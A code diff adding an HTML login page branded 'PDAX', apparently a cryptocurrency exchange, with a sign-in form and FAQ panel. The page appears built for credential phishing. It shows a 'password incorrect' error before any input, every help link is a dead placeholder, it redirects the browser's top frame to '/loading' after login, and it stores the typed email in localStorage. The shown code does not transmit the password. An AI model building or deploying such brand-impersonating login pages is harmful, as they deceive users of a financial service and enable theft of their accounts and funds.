@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<base target="_top" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PDAX</title>
+<style>
+  :root { --green:#2bb24c; --green-dark:#249c43; --ink:#1f2328; --muted:#8a9099; --line:#e3e6ea; }
+  * { box-sizing:border-box; }
+  html,body { margin:0; height:100%; }
+  body { font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; color:var(--ink); background:#fff; }
+  .topbar { height:64px; display:flex; align-items:center; padding:0 40px; border-bottom:1px solid var(--line); }
+  .logo { display:flex; align-items:center; gap:8px; font-weight:700; font-size:20px; letter-spacing:.5px; }
+  .logo .mark { width:14px; height:14px; border-radius:3px; background:var(--green); transform:rotate(45deg); }
+  .logo .mark2 { color:var(--green); }
+  .wrap { max-width:1040px; margin:0 auto; padding:56px 24px 80px; display:grid; grid-template-columns:1fr 1fr; gap:56px; align-items:start; }
+  h1 { font-size:52px; font-weight:600; margin:0 0 36px; }
+  .field { position:relative; border:1px solid var(--line); border-radius:10px; height:56px; margin-bottom:20px; transition:border-color .15s, box-shadow .15s; }
+  .field:focus-within { border-color:var(--green); box-shadow:0 0 0 3px rgba(43,178,76,.12); }
+  .field input { position:absolute; inset:0; width:100%; height:100%; border:0; outline:0; font-size:16px; color:var(--ink); background:transparent; padding:0 44px 0 18px; border-radius:10px; }
+  .field label { position:absolute; left:14px; top:50%; transform:translateY(-50%); font-size:16px; color:var(--muted); background:#fff; padding:0 4px; pointer-events:none; transition:top .15s, font-size .15s, color .15s; }
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label { top:0; font-size:12px; }
+  .field input:focus + label { color:var(--green); }
+  .eye { position:absolute; right:16px; top:50%; transform:translateY(-50%); background:none; border:0; cursor:pointer; color:var(--muted); padding:4px; display:flex; z-index:2; }
+  .eye svg { width:22px; height:22px; }
+  .help { font-size:17px; color:var(--ink); line-height:1.6; margin:4px 0 0; }
+  .help a { color:var(--green); font-weight:600; text-decoration:none; }
+  .help a:hover { text-decoration:underline; }
+  .login-btn { width:100%; margin-top:40px; padding:15px; border:0; border-radius:8px; background:var(--green); color:#fff; font-size:17px; font-weight:600; cursor:pointer; transition:background .15s, opacity .15s; }
+  .login-btn:disabled { opacity:.45; cursor:not-allowed; }
+  .login-btn:not(:disabled):hover { background:var(--green-dark); }
+  .signup { text-align:center; margin-top:22px; font-size:16px; }
+  .signup a { color:var(--green); font-weight:600; text-decoration:none; }
+  .error-box { display:flex; align-items:flex-start; gap:10px; background:#fdecec; border:1px solid #f5c2c2; color:#b42318; border-radius:10px; padding:12px 14px; margin-bottom:24px; font-size:15px; line-height:1.4; }
+  .error-box svg { flex:0 0 20px; width:20px; height:20px; margin-top:1px; }
+  .faq { border:1px solid var(--line); border-radius:14px; padding:28px 30px; }
+  .faq h2 { font-size:30px; font-weight:600; margin:0 0 10px; }
+  .faq .q { padding:18px 0; border-bottom:1px solid var(--line); font-size:16px; color:var(--ink); }
+  .faq .q:last-child { border-bottom:0; }
+  .faq .q a { color:var(--green); font-weight:600; text-decoration:none; }
+  @media (max-width:860px){ .wrap{ grid-template-columns:1fr; gap:36px; padding-top:36px; } h1{ font-size:40px; } .topbar{ padding:0 20px; } }
+</style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="logo"><span class="mark"></span>P<span class="mark2">D</span>AX</div>
+  </div>
+
+  <div class="wrap">
+    <section>
+      <h1>Log in</h1>
+
+      <div class="error-box" role="alert">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <span>The email or password you entered is incorrect. Please try again.</span>
+      </div>
+
+      <div class="field">
+        <input id="email" type="email" placeholder=" " autocomplete="email" />
+        <label for="email">Email address</label>
+      </div>
+
+      <div class="field">
+        <input id="password" type="password" placeholder=" " autocomplete="current-password" />
+        <label for="password">Password</label>
+        <button class="eye" id="toggle" type="button" aria-label="Show password">
+          <svg id="eye-off" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/><path d="M6.61 6.61A13.5 13.5 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/><line x1="2" y1="2" x2="22" y2="22"/></svg>
+          <svg id="eye-on" style="display:none" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
+      </div>
+
+      <p class="help">Need help logging in? Click here to<br/>
+        <a href="#">Unlock your account</a> or <a href="#">Reset Password.</a>
+      </p>
+
+      <button class="login-btn" id="login" type="button" disabled>Login</button>
+      <p class="signup">Not registered yet? <a href="#">Create an account</a></p>
+    </section>
+
+    <aside class="faq">
+      <h2>FAQs</h2>
+      <div class="q">What should I do if I forgot my password?</div>
+      <div class="q">How do I unlock my account?</div>
+      <div class="q">How do I update my password if I want to change it?</div>
+      <div class="q">Why did I get a notification about a login attempt?</div>
+      <div class="q">How do I keep my account secure?</div>
+      <div class="q">If you continue to encounter errors, please contact our <a href="#">Customer Support</a> here.</div>
+    </aside>
+  </div>
+
+  <script>
+    var email = document.getElementById('email');
+    var pass = document.getElementById('password');
+    var login = document.getElementById('login');
+    var toggle = document.getElementById('toggle');
+    var eyeOn = document.getElementById('eye-on');
+    var eyeOff = document.getElementById('eye-off');
+
+    var emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    function validPassword(v) {
+      return /[A-Za-z]/.test(v) && /[0-9]/.test(v) && /[^A-Za-z0-9]/.test(v);
+    }
+    function refresh() {
+      login.disabled = !(emailRe.test(email.value.trim()) && validPassword(pass.value));
+    }
+    email.addEventListener('input', refresh);
+    pass.addEventListener('input', refresh);
+
+    // Prefill the email the user typed; keep password empty.
+    try {
+      var saved = localStorage.getItem('pdax_login_email');
+      if (saved) email.value = saved;
+    } catch (e) {}
+    pass.value = '';
+    refresh();
+
+    login.addEventListener('click', function () {
+      if (login.disabled) return;
+      try { localStorage.setItem('pdax_login_email', email.value.trim()); } catch (e) {}
+      (window.top || window).location.href = '/loading';
+    });
+
+    toggle.addEventListener('click', function () {
+      var show = pass.type === 'password';
+      pass.type = show ? 'text' : 'password';
+      eyeOn.style.display = show ? 'block' : 'none';
+      eyeOff.style.display = show ? 'none' : 'block';
+      toggle.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
+    });
+  </script>
+</body>
+</html>
